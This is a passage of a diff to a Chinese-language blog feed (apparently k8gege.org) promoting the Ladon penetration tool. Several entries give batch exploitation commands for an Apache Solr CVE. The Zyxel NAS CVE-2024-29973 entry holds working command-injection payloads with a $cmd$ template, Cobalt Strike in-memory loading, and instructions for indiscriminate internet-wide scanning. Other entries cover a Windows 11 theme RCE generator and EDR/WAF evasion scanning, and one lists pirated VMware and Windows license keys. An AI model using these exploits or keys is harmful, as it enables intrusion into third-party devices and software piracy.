class="line">Ladon 192.168.1.8 CVE-2024-45216.exe</span><br><span class="line">Ladon 192.168.1.8 CVE-2024-45216.dll</span><br></pre></td></tr></table></figure><h3 id="批量URL">批量URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt CVE-2024-45216.exe</span><br></pre></td></tr></table></figure><p>PS：TXT可存放IP、IP:Port、URL等格式</p><p><img src="/k8img/Ladon/exp/CVE-2024-45216/vul.png" alt="使用http访问查看图片"></p><h3 id="批量IP">批量IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt CVE-2024-45216.exe</span><br><span class="line">Ladon noping ip.txt CVE-2024-45216.exe</span><br></pre></td></tr></table></figure><h3 id="指定C段">指定C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 CVE-2024-45216.exe</span><br><span class="line">Ladon noping 192.168.1.8/24 CVE-2024-45216.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/24 CVE-2024-45216.dll</span><br><span class="line">Ladon noping 192.168.1.8/24 CVE-2024-45216.dll</span><br></pre></td></tr></table></figure><h3 id="指定B段">指定B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/b CVE-2024-45216.exe</span><br><span class="line">Ladon noping 192.168.1.8/b CVE-2024-45216.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/b CVE-2024-45216.dll</span><br><span class="line">Ladon noping 192.168.1.8/b CVE-2024-45216.dll</span><br></pre></td></tr></table></figure><h3 id="指定A段">指定A段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/a CVE-2024-45216.exe</span><br><span class="line">Ladon noping 192.168.1.8/a CVE-2024-45216.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/a CVE-2024-45216.dll</span><br><span class="line">Ladon noping 192.168.1.8/a CVE-2024-45216.dll</span><br></pre></td></tr></table></figure><h3 id="批量C段">批量C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt CVE-2024-45216.exe</span><br><span class="line">Ladon ipc.txt CVE-2024-45216.exe</span><br><span class="line"></span><br><span class="line">Ladon noping ip24.txt CVE-2024-45216.exe</span><br><span class="line">Ladon noping ipc.txt CVE-2024-45216.exe</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的C段IP</p><h3 id="批量B段">批量B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt CVE-2024-45216.exe</span><br><span class="line">Ladon noping ip16.txt CVE-2024-45216.exe</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的B段IP</p><h3 id="批量网段">批量网段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon cidr.txt CVE-2024-45216.exe</span><br><span class="line">Ladon noping cidr.txt CVE-2024-45216.exe</span><br></pre></td></tr></table></figure><p>PS: TXT存放各种IP网段，全网无差别扫描</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1&gt;Ladon CVE-2024-45216 影响版本 Apache Solr 5.3.0 &amp;lt;= Apache Solr &amp;lt; 8.11.4  9.0.0 &amp;lt;= Apache Solr &amp;lt; 9.7.0&lt;/h1&gt;
+&lt;p&gt;++++++++++++++++++</summary>
+      
+    
+    
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="Apache Solr" scheme="http://k8gege.org/tags/Apache-Solr/"/>
+    
+    <category term="CVE-2024-45216" scheme="http://k8gege.org/tags/CVE-2024-45216/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>〖key〗Vmware 17 注册码 许可证 官方免注册下载地址</title>
+    <link href="http://k8gege.org/p/VmwareKey.html"/>
+    <id>http://k8gege.org/p/VmwareKey.html</id>
+    <published>2024-10-20T08:11:00.000Z</published>
+    <updated>2025-04-18T15:24:58.938Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="Vmware最新注册码">Vmware最新注册码</h3><p>17.x<br>JU090-6039P-08409-8J0QH-2YR7F</p><p>vmware12及vmware14注册码</p><p>vmware12 5A02H-AU243-TZJ49-GTC7K-3C61N</p><p>vmware14 CG54H-D8D0H-H8DHY-C6X7X-N2KG6</p><p>vm 12.0 - 12.5.0<br>5A02H-AU243-TZJ49-GTC7K-3C61N</p><p>15.5<br>UY758-0RXEQ-M81WP-8ZM7Z-Y3HDA</p><p>WIN7 X64 旗舰版 注册码</p><p>HT6VR-XMPDJ-2VBFV-R9PFY-3VP7R</p><p>VMware Workstation 10.0 序列号(KEY)</p><p>5F29M-48312-8ZDF9-A8A5K-2AM0Z</p><h3 id="官方下载地址">官方下载地址</h3><p>官网下载地址 需注册<a href="https://www.vmware.com/content/vmware/vmware-published-sites/us/products/workstation-player/workstation-player-evaluation.html.html">https://www.vmware.com/content/vmware/vmware-published-sites/us/products/workstation-player/workstation-player-evaluation.html.html</a></p><p>官方的压缩包 直接下载 无需注册<a href="https://softwareupdate.vmware.com/cds/vmw-desktop/ws/17.5.2/23775571/windows/core/VMware-workstation-17.5.2-23775571.exe.tar">https://softwareupdate.vmware.com/cds/vmw-desktop/ws/17.5.2/23775571/windows/core/VMware-workstation-17.5.2-23775571.exe.tar</a></p><h3 id="Download">Download</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>History: <a href="http://github.com/k8gege/Ladon/releases">http://github.com/k8gege/Ladon/releases</a><br>9.1.1：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>10.8：K8小密圈</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;Vmware最新注册码&quot;&gt;Vmware最新注册码&lt;/h3&gt;
+&lt;p&gt;17.x&lt;br&gt;
+JU090-6039P-08409-8J0QH-2YR7F&lt;/p&gt;
+&lt;p&gt;vmware12及vmware14注册码&lt;/p&gt;
+&lt;p&gt;vmware12 5A02H-AU243-TZJ4</summary>
+      
+    
+    
+    
+    <category term="Key" scheme="http://k8gege.org/categories/Key/"/>
+    
+    
+    <category term="Vmware" scheme="http://k8gege.org/tags/Vmware/"/>
+    
+    <category term="Key" scheme="http://k8gege.org/tags/Key/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>LadonExp CVE-2024-29973漏洞复现批量扫描教程</title>
+    <link href="http://k8gege.org/p/CVE-2024-29973.html"/>
+    <id>http://k8gege.org/p/CVE-2024-29973.html</id>
+    <published>2024-08-11T15:40:00.000Z</published>
+    <updated>2025-04-18T15:24:43.544Z</updated>
+    
+    <content type="html"><![CDATA[<h1>Ladon CVE-2024-29973 Zyxel漏洞复现批量扫描教程</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/CVE-2024-29973.html";</script><p>LadonEXP一键生成Poc/Exp，批量漏洞挖掘，快速获取权限。使用Ladon可对C段、B段、A段、全网批量扫描，0day/1day/Nday快速利用。</p><h3 id="免责声明">免责声明</h3><p>Ladon项目所涉及的技术、思路和工具仅供学习或授权渗透，非法用途后果自负。</p><h3 id="漏洞编号">漏洞编号</h3><p>CVE-2024-29973</p><h3 id="影响版本">影响版本</h3><p>Zyxel NAS542<br>Zyxel NAS326</p><h3 id="应用指纹">应用指纹</h3><p>app=“ZYXEL-NAS326”</p><h3 id="漏洞简介">漏洞简介</h3><p>Zyxel NAS542和Zyxel NAS326都是中国合勤（Zyxel）公司的产品。Zyxel NAS542是一款NAS（网络附加存储）设备。Zyxel NAS326是一款云存储 NAS。Zyxel NAS326 V5.21(AAZF.17)C0之前版本、NAS542 V5.21(ABAG.14)C0之前版本存在操作系统命令注入漏洞，该漏洞源于setCookie参数中存在命令注入漏洞，从而导致攻击者可通过HTTP POST请求来执行某些操作系统 (OS) 命令。</p><h3 id="配置信息">配置信息</h3><p>LadonExp.ini填写漏洞相关信息，生成POC/EXP会生成本文MarkDown使用教程</p><p><img src="/k8img/Ladon/exp/CVE-2024-29973/cfg.png" alt="使用http访问查看图片"></p><h3 id="Payload">Payload</h3><h4 id="POC">POC</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__(<span class="string">&quot;subprocess&quot;</span>).check_output(<span class="string">&quot;id&quot;</span>,+shell=True)%23</span><br><span class="line">Host: 192.168.1.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/exp/CVE-2024-29973/poc.png" alt="使用http访问查看图片"></p><h4 id="EXP">EXP</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__(<span class="string">&quot;subprocess&quot;</span>).check_output(<span class="string">&quot;$cmd$&quot;</span>,+shell=True)%23</span><br><span class="line">Host: 192.168.1.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/exp/CVE-2024-29973/exp.png" alt="使用http访问查看图片"></p><p>PS: 使用LadonExp填上对应内容，即可生成POC/EXP</p><h3 id="POC独立使用">POC独立使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2024-29973.exe http://192.168.1.8</span><br></pre></td></tr></table></figure><p>PS: 部分https站点需Ladon调用扫描</p><h3 id="EXP执行命令">EXP执行命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2024-29973.exe http://192.168.1.8 <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>PS: 将payload中的cmd命令如whoami替换成$cmd$ 即可生成EXP</p><h3 id="CS使用POC">CS使用POC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; execute-assembly C:\Ladon\CVE-2024-29973.exe http://192.168.1.8</span><br></pre></td></tr></table></figure><p>PS: Cobalt Strike内存加载CVE-2024-29973.exe</p><h3 id="指定URL">指定URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://192.168.1.8 CVE-2024-29973.exe</span><br><span class="line">Ladon http://192.168.1.8 CVE-2024-29973.dll</span><br></pre></td></tr></table></figure><h3 id="指定IP">指定IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 CVE-2024-29973.exe</span><br><span class="line">Ladon 192.168.1.8 CVE-2024-29973.dll</span><br></pre></td></tr></table></figure><h3 id="批量URL">批量URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt CVE-2024-29973.exe</span><br></pre></td></tr></table></figure><p>PS：TXT可存放IP、IP:Port、URL等格式</p><p><img src="/k8img/Ladon/exp/CVE-2024-29973/scan.png" alt="使用http访问查看图片"></p><h3 id="批量IP">批量IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt CVE-2024-29973.exe</span><br><span class="line">Ladon noping ip.txt CVE-2024-29973.exe</span><br></pre></td></tr></table></figure><h3 id="指定C段">指定C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 CVE-2024-29973.exe</span><br><span class="line">Ladon noping 192.168.1.8/24 CVE-2024-29973.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/24 CVE-2024-29973.dll</span><br><span class="line">Ladon noping 192.168.1.8/24 CVE-2024-29973.dll</span><br></pre></td></tr></table></figure><h3 id="指定B段">指定B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/b CVE-2024-29973.exe</span><br><span class="line">Ladon noping 192.168.1.8/b CVE-2024-29973.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/b CVE-2024-29973.dll</span><br><span class="line">Ladon noping 192.168.1.8/b CVE-2024-29973.dll</span><br></pre></td></tr></table></figure><h3 id="指定A段">指定A段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/a CVE-2024-29973.exe</span><br><span class="line">Ladon noping 192.168.1.8/a CVE-2024-29973.exe</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/a CVE-2024-29973.dll</span><br><span class="line">Ladon noping 192.168.1.8/a CVE-2024-29973.dll</span><br></pre></td></tr></table></figure><h3 id="批量C段">批量C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt CVE-2024-29973.exe</span><br><span class="line">Ladon ipc.txt CVE-2024-29973.exe</span><br><span class="line"></span><br><span class="line">Ladon noping ip24.txt CVE-2024-29973.exe</span><br><span class="line">Ladon noping ipc.txt CVE-2024-29973.exe</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的C段IP</p><h3 id="批量B段">批量B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt CVE-2024-29973.exe</span><br><span class="line">Ladon noping ip16.txt CVE-2024-29973.exe</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的B段IP</p><h3 id="批量网段">批量网段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon cidr.txt CVE-2024-29973.exe</span><br><span class="line">Ladon noping cidr.txt CVE-2024-29973.exe</span><br></pre></td></tr></table></figure><p>PS: TXT存放各种IP网段，全网无差别扫描</p><h3 id="DownLoad">DownLoad</h3><p><a href="https://github.com/k8gege/Ladon/blob/master/CVE-2024-29973.rar">https://github.com/k8gege/Ladon/blob/master/CVE-2024-29973.rar</a><br><a href="https://github.com/k8gege/Ladon/blob/master/LadonExp.exe">https://github.com/k8gege/Ladon/blob/master/LadonExp.exe</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1&gt;Ladon CVE-2024-29973 Zyxel漏洞复现批量扫描教程&lt;/h1&gt;
+&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</summary>
+      
+    
+    
+    
+    <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="Zyxel" scheme="http://k8gege.org/tags/Zyxel/"/>
+    
+    <category term="CVE-2024-29973" scheme="http://k8gege.org/tags/CVE-2024-29973/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ladon CMS识别 FortiGate Vcenter Zimbra Exchange FireEye</title>
+    <link href="http://k8gege.org/p/whatcms.html"/>
+    <id>http://k8gege.org/p/whatcms.html</id>
+    <published>2024-01-08T09:00:00.000Z</published>
+    <updated>2025-04-18T15:24:59.668Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://github.com/k8gege"><img src="https://img.shields.io/badge/Author-k8gege-blueviolet" alt="Author"></a> <a href="https://github.com/k8gege/Ladon"><img src="https://img.shields.io/badge/Ladon-12.4-yellowgreen" alt="Ladon"></a> <a href="https://github.com/k8gege/Ladon/releases"><img src="https://img.shields.io/badge/Ladon-Bin-ff69b4" alt="Bin"></a> <a href="https://github.com/k8gege/Ladon/issues"><img src="https://img.shields.io/github/issues/k8gege/Ladon" alt="GitHub issues"></a> <a href="https://github.com/k8gege/Ladon"><img src="https://img.shields.io/github/stars/k8gege/Ladon" alt="Github Stars"></a> <a href="https://github.com/k8gege/Ladon"><img src="https://img.shields.io/github/forks/k8gege/Ladon" alt="GitHub forks"></a><a href="https://github.com/k8gege/Ladon"><img src="https://img.shields.io/github/license/k8gege/Ladon" alt="GitHub license"></a></p><p style="color:303030;"> <span class="fa fa-eye">Visit: <span id="busuanzi_value_page_pv"></span></span></p><p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/whatcms.html";</script><p>Ladon完整文档、简明使用教程，包含EXE、PowerShell、Cobalt Strike、Linux/Mac版</p><p><img src="/k8img/Ladon/ico/Ico.png" alt="使用http访问查看图片"></p><h3 id="Ladon简介">Ladon简介</h3><p>Ladon模块化网络渗透工具，可PowerShell模块化、可CS插件化、可内存加载，无文件扫描。含端口扫描、服务识别、网络资产探测、密码审计、高危漏洞检测、漏洞利用、密码读取以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描等。12.4版本内置265个功能模块,网络资产探测模块32种协议(ICMP\NBT\DNS\MAC\SMB\WMI\SSH\HTTP\HTTPS\Exchange\mssql\FTP\RDP)以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、交换机、数据库、打印机等信息，高危漏洞检测16个包含Cisco、Zimbra、Exchange、DrayTek、MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列、Printer等，密码审计23个含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(smbexec/wmiexe/psexec/atexec/sshexec/webshell),Web指纹识别模块可识别135+（Web应用、中间件、脚本类型、页面类型）等，本地提权21+含SweetPotato\BadPotato\EfsPotato\BypassUAC,可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p><h3 id="运行环境">运行环境</h3><p>跨平台：支持Windows、Linux、Mac等操作系统，不过更推荐Windows下使用<br>任意权限：支持服务、System、用户等任意权限，不会因权限低或SYS就用不了<br>各种CMD：支持远控CMD、交互式shell、webshell、powershell、反弹shell等<br>插件化：支持Cobalt Strike插件化内存加载使用，Beacon命令行或右键可视化</p><h3 id="CMS识别-资产探测-WhatCMS">CMS识别/资产探测/WhatCMS</h3><table><thead><tr><th>模块功能</th><th>使用教程</th></tr></thead><tbody><tr><td>CMS识别 FireEye Trellix EDR NDR XDR</td><td><a href="http://k8gege.org/Ladon/cms_trellix">http://k8gege.org/Ladon/cms_trellix</a></td></tr><tr><td>CMS识别 FortiGate 飞塔防火墙</td><td><a href="http://k8gege.org/Ladon/cms_fortigate">http://k8gege.org/Ladon/cms_fortigate</a></td></tr><tr><td>CMS识别 飞塔FortiManager</td><td><a href="http://k8gege.org/Ladon/cms_fortimanager">http://k8gege.org/Ladon/cms_fortimanager</a></td></tr><tr><td>CMS识别 K8s kubernetes</td><td><a href="http://k8gege.org/Ladon/cms_k8s">http://k8gege.org/Ladon/cms_k8s</a></td></tr><tr><td>CMS识别 Draytek路由器</td><td><a href="http://k8gege.org/Ladon/cms_draytek">http://k8gege.org/Ladon/cms_draytek</a></td></tr><tr><td>CMS识别 Froxlor</td><td><a href="http://k8gege.org/Ladon/cms_froxlor">http://k8gege.org/Ladon/cms_froxlor</a></td></tr><tr><td>CMS识别 Zyxel USG</td><td><a href="http://k8gege.org/Ladon/cms_zyxel_usg">http://k8gege.org/Ladon/cms_zyxel_usg</a></td></tr><tr><td>CMS识别 Grafana</td><td><a href="http://k8gege.org/Ladon/cms_grafana">http://k8gege.org/Ladon/cms_grafana</a></td></tr><tr><td>CMS识别 HP打印机</td><td><a href="http://k8gege.org/Ladon/cms_hp_mfp">http://k8gege.org/Ladon/cms_hp_mfp</a></td></tr><tr><td>CMS识别 Vmware Vcenter</td><td><a href="http://k8gege.org/Ladon/cms_vcenter">http://k8gege.org/Ladon/cms_vcenter</a></td></tr><tr><td>CMS识别 Zimbra邮件服务器</td><td><a href="http://k8gege.org/Ladon/cms_zimbra">http://k8gege.org/Ladon/cms_zimbra</a></td></tr><tr><td>CMS识别 Exchange邮件服务器</td><td><a href="http://k8gege.org/Ladon/cms_exchange">http://k8gege.org/Ladon/cms_exchange</a></td></tr></tbody></table><h3 id="更多功能-使用教程">更多功能 使用教程</h3><p><a href="http://k8gege.org/Ladon/">http://k8gege.org/Ladon/</a></p><h3 id="Ladon下载">Ladon下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a><br>911版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/k8gege&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Author-k8gege-blueviolet&quot; alt=&quot;Author&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://g</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ladon渗透绕过WAF、EDR、防火墙扫描</title>
+    <link href="http://k8gege.org/p/bypassEDR.html"/>
+    <id>http://k8gege.org/p/bypassEDR.html</id>
+    <published>2023-12-26T14:34:00.000Z</published>
+    <updated>2025-04-18T15:24:36.633Z</updated>
+    
+    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/bypassEDR.html";</script><h3 id="BypassEDR扫描">BypassEDR扫描</h3><p>默认扫描速度很快，有些WAF或EDR防御很强<br><br>设置几线程都有可能20分钟左右就不能扫了<br><br>bypassEDR模拟人工访问，绕过速度检测策略<br></p><p>扫描速度较慢，追求速度的愣头青不要使用<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 10.1.2.8/24 MS17010 bypassEDR</span><br></pre></td></tr></table></figure><p>密码爆破相关模块暂不支持bypassEDR参数</p><h3 id="001-自定义线程扫描">001 自定义线程扫描</h3><p>例子：扫描目标10.1.2段是否存在MS17010漏洞<br><br>单线程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 10.1.2.8/24 MS17010 t=1</span><br></pre></td></tr></table></figure><p>80线程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon noping 10.1.2.8/24 MS17010 t=80</span><br></pre></td></tr></table></figure><p>高强度防护下扫描线程设置低一些，F单线程<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 10.1.2.8/24 MS17010 f=1</span><br></pre></td></tr></table></figure><h3 id="002-Socks5代理扫描">002 Socks5代理扫描</h3><p>例子：使用8线程扫描目标10.1.2段是否存在MS17010漏洞<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon noping 10.1.2.8/24 MS17010 t=8&lt;br&gt;</span><br></pre></td></tr></table></figure><p>详见：<a href="http://k8gege.org/Ladon/proxy.html">http://k8gege.org/Ladon/proxy.html</a></p><p>PS：代理工具不支持Socks5，所以必须加noping参数扫描<br><br>不管是Frp还是其它同类工具，最主要是Proxifier等工具不支持ICMP协议<br><br>因为Ladon默认先用ICMP探测存活后，才使用对应模块测试<br><br>所以代理环境下得禁ping扫描，系统ping使用的就是ICMP协议</p><h3 id="Download">Download</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>History: <a href="http://github.com/k8gege/Ladon/releases">http://github.com/k8gege/Ladon/releases</a><br>9.1.1：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>12.3：K8小密圈</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;=============================================================================================&lt;br&gt;
++++++++++++++++++++++++++++++++++++++++</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="waf" scheme="http://k8gege.org/tags/waf/"/>
+    
+    <category term="edr" scheme="http://k8gege.org/tags/edr/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ladon漏洞复现Win11 RCE CVE-2023-38146</title>
+    <link href="http://k8gege.org/p/CVE-2023-38146.html"/>
+    <id>http://k8gege.org/p/CVE-2023-38146.html</id>
+    <published>2023-12-26T06:30:00.000Z</published>
+    <updated>2025-04-18T15:24:43.117Z</updated>
+    
+    <content type="html"><![CDATA[<p style="color:#fff;"> <% <span class="archive-article-date">Visit <span id="busuanzi_value_page_pv"></span></span>%></p><h3 id="Ladon">Ladon</h3><p>Ladon 12.3   20231221<br>[+]SmbServer 一键SMB共享服务器，记录来访IP，访问资源等<br>[+]Win11ThemeRce CVE-2023-38146 Win11主题远程执行Exploit</p><h3 id="开启SMB服务器-支持win11主题rce">开启SMB服务器(支持win11主题rce)</h3><p>Ladon SmbServer</p><h3 id="生成CVE-2023-38146-poc">生成CVE-2023-38146 poc</h3><p>Ladon Win11ThemeRce 192.168.1.8</p><p>程序同根目录下放share目录 stage_3可替换成自己的dll</p><p><img src="/k8img/Ladon/win11_theme_smb.png" alt="使用http访问查看图片"></p><p>在Win11机器上，双击win11poc.theme，将会弹出计算器</p><p>PS：需关闭系统SMB服务，不让445端口占用</p><p><img src="/k8img/Ladon/win11_theme_poc.png" alt="使用http访问查看图片"></p><h3 id="工具下载">工具下载</h3><p>最新版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p style=&quot;color:#fff;&quot;&gt; 
+&lt;% 
+&lt;span class=&quot;archive-article-date&quot;&gt;
+Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
+&lt;/span&gt;
+%&gt;
+&lt;/p&gt;
+&lt;h3 id=&quot;Lad</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ladon渗透Oracle数据库一键提权 密码爆破</title>
+    <link href="http://k8gege.org/p/OracleScan.html"/>
+    <id>http://k8gege.org/p/OracleScan.html</id>
+    <published>2023-12-16T06:20:00.000Z</published>
+    <updated>2025-04-18T15:24:57.465Z</updated>
+    
